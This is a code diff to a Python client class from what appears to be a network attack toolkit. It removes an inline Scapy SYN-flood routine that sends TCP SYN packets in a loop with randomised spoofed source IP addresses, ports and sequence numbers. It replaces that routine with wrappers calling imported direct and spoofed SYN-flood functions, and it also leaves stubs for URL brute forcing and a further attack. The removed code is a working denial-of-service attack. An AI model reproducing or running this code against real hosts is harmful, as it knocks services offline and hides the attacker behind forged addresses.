@@ -1,17 +1,15 @@
-from scapy.all import *
+import socket
 import requests
-from scapy.layers.inet import IP, TCP
 
 from server.server_requests.all_ips_in_country_request import AllIPsInCountryRequest
 from server.server_requests.country_request import CountryRequest
 from server.server_requests.server_request import ServerRequest
+from web_attacks.syn_flood_attack import perform_syn_flood_direct_attack, perform_syn_flood_spoofed_attack
 
 SERVER_URL = "http://127.0.0.1:8000"
 GET_COUNTRY_OF_ADDRESS_URL = "/get_country"
 GET_ALL_IPS_URL = "/get_all_ip_in_country"
 GET_TOP_COUNTRIES_URL = "/get_top_countries"
-
-NUMBER_OF_PACKETS = 10
 
 
 class Client:
@@ -38,44 +36,15 @@ class Client:
         url = SERVER_URL + GET_TOP_COUNTRIES_URL
         return self.__send_get_request(url)
 
-    def __send_syn_packet(self, target_address: str, target_port: int):
-        source_port = self.__random_int()
-        source_seq = self.__random_int()
-        window_size = self.__random_int()
+    def perform_syn_flood_direct_attack(self, target_address: str, target_port: int, number_of_packets: int):
+        client_ip_address = socket.gethostbyname(socket.gethostname())
+        perform_syn_flood_direct_attack(target_address, target_port, number_of_packets, client_ip_address)
 
-        ip_packet = IP()
-        ip_packet.src = self.__random_ip() # Spoofed Attack
-        ip_packet.dst = target_address
-
-        tcp_packet = TCP()
-        tcp_packet.sport = source_port
-        tcp_packet.dport = target_port
-        tcp_packet.flags = "S"
-        tcp_packet.seq = source_seq
-        tcp_packet.window = window_size
-        send(ip_packet / tcp_packet, verbose=0)
-
-    def perform_syn_flood_attack(self, target_address: str, target_port: int, number_of_packets: int = NUMBER_OF_PACKETS):
-        successful_requests = 0
-        for packet in range(number_of_packets):
-            try:
-                self.__send_syn_packet(target_address, target_port)
-                successful_requests += 1
-                print(f"Done sending {packet} packets.")
-            except Exception as e:
-                print(f"An error occurred: {e}. Sent {successful_requests} packets. \nGoodbye.")
-                break
+    def perform_syn_flood_spoofed_attack(self, target_address: str, target_port: int, number_of_packets: int):
+        perform_syn_flood_spoofed_attack(target_address, target_port, number_of_packets)
 
     def perform_url_brute_force_attack(self, target_address: str, target_port: int):
         pass
 
     def perform_third_attack(self, target_address: str, target_port: int):
         pass
-
-    def __random_ip(self) -> str:
-        ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-        return ip
-
-    def __random_int(self) -> int:
-        x = random.randint(1000, 9000)
-        return x
